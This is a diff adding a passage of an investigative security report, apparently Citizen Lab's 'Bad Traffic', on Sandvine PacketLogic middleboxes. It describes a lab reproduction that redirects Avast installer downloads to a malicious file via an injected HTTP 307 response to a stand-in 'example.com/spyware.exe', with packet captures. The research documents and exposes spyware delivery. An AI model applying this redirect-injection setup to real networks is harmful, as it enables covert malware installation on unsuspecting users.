@@ -1,0 +1,65 @@
+Redirecting users to a malicious file
+We added a rule to redirect users who requested an Avast Antivirus setup file to a
+malicious file. This test involved creating a PropertyObject to match requests whose URL
+ended in the filename for Avast Antivirus: avast_free_antivirus_setup_online.exe, and
+then a Filtering Rule to redirect all connections matching the PropertyObject to a
+malicious file. This redirection used the built-in Inject action. The PacketLogic GUI has
+an “Insert 307 Temporary Redirect” button that, when pressed, pastes an HTTP 307
+Temporary Redirect response identical to element 3 of our fingerprint (at the start of this
+section). The PacketLogic operator can configure the “Location” header, which is initially
+blank; in this case, we entered: http://example.com/spyware.exe.
+https://citizenlab.ca/2018/03/bad-traffic-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/ 9/38
+6/30/2020 BAD TRAFFIC: Sandvine’s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Affiliate Ads?
+Figure 4: How we set up our Sandvine PacketLogic device to inject spyware when a user
+tries to download Avast Antivirus. We believe a similar setup exists in Turkey.
+Without any further configuration, this rule caused our PacketLogic device to inject the
+redirect in response to a matching request in either direction (internal to external, or
+external to internal). This mirrors our experience of being able to reproduce spyware
+injection in Turkey from requests sent external to internal. We noticed that we could add
+an extra condition to the rule in order to restrict the injection to a single direction.
+Our experiment matched elements 1-3 of our fingerprint, but did not completely match
+element 4. Specifically, our PacketLogic middlebox injected an unsolicited final ACK
+back-to-back after the FIN/ACK containing the 307 Temporary Redirect instead of
+injecting it following the ~100ms delay we observed in Turkey and Egypt. Our version of
+the PacketLogic firmware (12.1) was the first to support injection; we hypothesize that the
+~100ms delay between the data packet and the final ACK was added in a later firmware
+version, potentially to reduce the probability of the ACK being reordered before the
+FIN/ACK; such a reordering would cause the injection recipient’s TCP connection to hang
+in the LAST_ACK state, which is the scenario that sending the ACK seeks to avoid.
+Figure 5 shows an excerpt from our client-side PCAP that captures the injection from
+our test PacketLogic device. Note that the IPID is 13330 in both injected packets, both
+injected packets have no IP flags, the format of the HTTP 307 redirect is what we expect,
+and the final ACK packet is unsolicited.
+Client sends GET request for Avast file
+17:28:25.024018 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 170)
+192.168.1.27.49458 > 192.168.1.26.8080: Flags [P.], seq 1:119, ack 1, win 4117, options
+[nop,nop,TS val 756363711 ecr 2094486068], length 118: HTTP, length: 118
+GET /avast_free_antivirus_setup_online.exe HTTP/1.1
+https://citizenlab.ca/2018/03/bad-traffic-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/ 10/38
+6/30/2020 BAD TRAFFIC: Sandvine’s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Affiliate Ads?
+Host: 192.168.1.26:8080
+User-Agent: curl/7.54.0
+Accept: /
+Client receives injected data (redirect to spyware file)
+17:28:25.024300 IP (tos 0x0, ttl 64, id 13330, offset 0, flags [none], proto TCP (6), length
+134)
+192.168.1.26.8080 > 192.168.1.27.49458: Flags [F.], seq 1:95, ack 119, win 32120, length
+94: HTTP, length: 94
+HTTP/1.1 307 Temporary Redirect
+Location: http://example.com/spyware.exe
+Connection: close
+Client receives injected ACK
+17:28:25.024302 IP (tos 0x0, ttl 64, id 13330, offset 0, flags [none], proto TCP (6), length
+40)
+192.168.1.26.8080 > 192.168.1.27.49458: Flags [.], seq 96, ack 120, win 32120, length 0
+Figure 5: PacketLogic spyware injection from the client side.
+Figure 6 shows an excerpt from our server-side PCAP that captures the injection from
+our test PacketLogic device. Note that the server side does not receive the HTTP request
+for the Avast file. Instead, it receives an injected RST packet with IPID 13330 and no
+flags. Note that the timestamp discrepancy in the PCAP files is because the server and
+client clocks were not synchronized.
+Server receives injected RST
+17:28:06.715257 IP (tos 0x0, ttl 64, id 13330, offset 0, flags [none], proto TCP (6), length
+40)
+192.168.1.27.49458 > 192.168.1.26.8080: Flags [R], seq 681001116, win 32120, length 0
+Figure 6: PacketLogic spyware injection from the server side.
